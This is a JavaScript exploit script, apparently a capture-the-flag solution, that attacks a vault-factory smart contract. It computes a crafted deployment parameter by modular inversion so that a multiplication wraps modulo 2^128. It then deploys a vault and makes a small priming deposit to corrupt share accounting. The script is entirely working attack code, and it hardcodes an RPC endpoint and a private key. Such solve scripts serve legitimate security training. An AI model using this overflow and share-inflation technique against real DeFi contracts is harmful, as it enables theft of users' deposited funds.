// exploit.js — ethers 5.7.2
const { ethers } = require("ethers")

// --- Provided credentials (used as-is) ---
const RPC_URL =
  "http://103.226.138.119:24379/21d87500-ff72-4f1e-a5e7-0bbfeed55b0a"
const PRIVKEY =
  "f22c927ef76d62d4f08eacbb449d367de7dfb46102d4de45f930af146ea538ec"
const SETUP_CONTRACT_ADDR = "0xB331f1Fb0e05936bfbd94313D2ac8AF09129FF81"
const WALLET_ADDR = "0x4E42f215bf9B6848d66cf6a280ed3A09737A3E00"

// --- ABIs (minimal) ---
const ABI_SETUP = [
  "function vaultFactory() view returns (address)",
  "function isSolved() returns (bool)",
]
const ABI_FACTORY = [
  "function deploy(uint256[][] params) external",
  "function vaultAt(uint256) view returns (address)",
]
const ABI_VAULT = [
  "function asset() view returns (address)",
  "function deposit(uint256 amount, address receiver) returns (uint256 shares)",
  "function balanceOf(address) view returns (uint256)",
]
const ABI_TOKEN = [
  "function mintToPlayer() external",
  "function approve(address,uint256) external returns (bool)",
  "function balanceOf(address) view returns (uint256)",
]

// --- Math helpers to compute params[2] ---
function modInvOdd(a, mod) {
  // Inverse of odd a modulo 2^k using Hensel lifting
  let inv = 1n // a ≡ 1 (mod 2) so inv ≡ 1 initially
  let m = 2n
  while (m < mod) {
    const m2 = m * 2n
    // inv' = inv * (2 - a*inv) (mod 2m)
    const t = (2n - ((a * inv) % m2) + m2) % m2
    inv = (inv * t) % m2
    m = m2
  }
  return inv % mod
}

function computeParam2() {
  // We choose t = 6 so the priming deposit is a = 2^t = 64
  const t = 6n
  const k128 = 1n << 128n
  const tenPow6 = 10n ** 6n // 1_000_000
  const gcd = 1n << 6n // gcd(10^6, 2^128) = 2^6
  // Target residue: params[2] * 10^6 ≡ 2^(105+t) - 2^t (mod 2^128)
  const RHS = (1n << (105n + t)) - (1n << t)

  // Reduce by gcd, solve modulo 2^(128-6)
  const mod = 1n << 122n
  const A = tenPow6 / gcd // 15625 (odd = 5^6)
  const B = RHS / gcd

  const invA = modInvOdd(A, mod)
  const param2 = ((B % mod) * invA) % mod

  // Sanity check (optional)
  const check = (param2 * tenPow6) % k128
  // console.log("check low128 =", "0x" + check.toString(16));
  // console.log("target low128 =", "0x" + RHS.toString(16));

  return { param2: param2.toString(), t }
}

async function main() {
  console.log("[*] Connecting...")
  const provider = new ethers.providers.JsonRpcProvider(RPC_URL)
  const wallet = new ethers.Wallet(PRIVKEY, provider)
  if (wallet.address.toLowerCase() !== WALLET_ADDR.toLowerCase()) {
    console.log(
      "! Wallet address derived from PRIVKEY differs from provided WALLET_ADDR"
    )
    console.log("  Derived:", wallet.address, " Provided:", WALLET_ADDR)
  }
  console.log("[*] Using signer:", wallet.address)
  console.log(
    "[*] Balance:",
    (await provider.getBalance(wallet.address)).toString()
  )

  const { param2, t } = computeParam2()
  const a = 1n << t // 64
  console.log("[*] Computed params[2] =", param2)
  console.log("[*] Priming deposit a   =", a.toString())

  const setup = new ethers.Contract(SETUP_CONTRACT_ADDR, ABI_SETUP, wallet)
  const factoryAddr = await setup.vaultFactory()
  console.log("[*] VaultFactory =", factoryAddr)
  const factory = new ethers.Contract(factoryAddr, ABI_FACTORY, wallet)

  // 1) Deploy first vault: [fee=1, tier=1, param2]
  console.log("[*] Deploying vault...")
  const txDep = await factory.deploy([
    [ethers.constants.One, ethers.constants.One, ethers.BigNumber.from(param2)],
  ])
  console.log("   tx:", txDep.hash)
  await txDep.wait()
  const vaultAddr = await factory.vaultAt(0)
  console.log("[+] Vault deployed @", vaultAddr)

  // 2) Interact with token
  const vault = new ethers.Contract(vaultAddr, ABI_VAULT, wallet)
  const tokenAddr = await vault.asset()
  console.log("[*] Token =", tokenAddr)
  const token = new ethers.Contract(tokenAddr, ABI_TOKEN, wallet)

  console.log("[*] Minting TKN to player...")
  const txMint = await token.mintToPlayer()
  console.log("   tx:", txMint.hash)
  await txMint.wait()

  const bal = await token.balanceOf(wallet.address)
  console.log("[*] Player TKN balance =", bal.toString())

  console.log("[*] Approving priming deposit of", a.toString())
  const txApp = await token.approve(vaultAddr, a.toString())
  console.log("   tx:", txApp.hash)
  await txApp.wait()

  console.log("[*] Priming deposit...")
  const txDep2 = await vault.deposit(a.toString(), wallet.address)
  console.log("   tx:", txDep2.hash)
  await txDep2.wait()
  console.log("[+] Priming deposit done.")

  //   // with this:
  //   console.log("[*] Calling isSolved() (tx)...")
  //   const tx = await setup.isSolved()
  //   console.log("   sent:", tx.hash)
  //   const rcpt = await tx.wait()
  //   console.log("[+] isSolved() tx mined in block", rcpt.blockNumber)

  //   // final confirmation without calling isSolved() again:
  //   const setupBal = await vault.balanceOf(SETUP_CONTRACT_ADDR)
  //   console.log(
  //     "[=] Vault.share balance(Setup) =",
  //     setupBal.toString(),
  //     "(expect 0)"
  //   )
}

main().catch((e) => {
  console.error(e)
  process.exit(1)
})
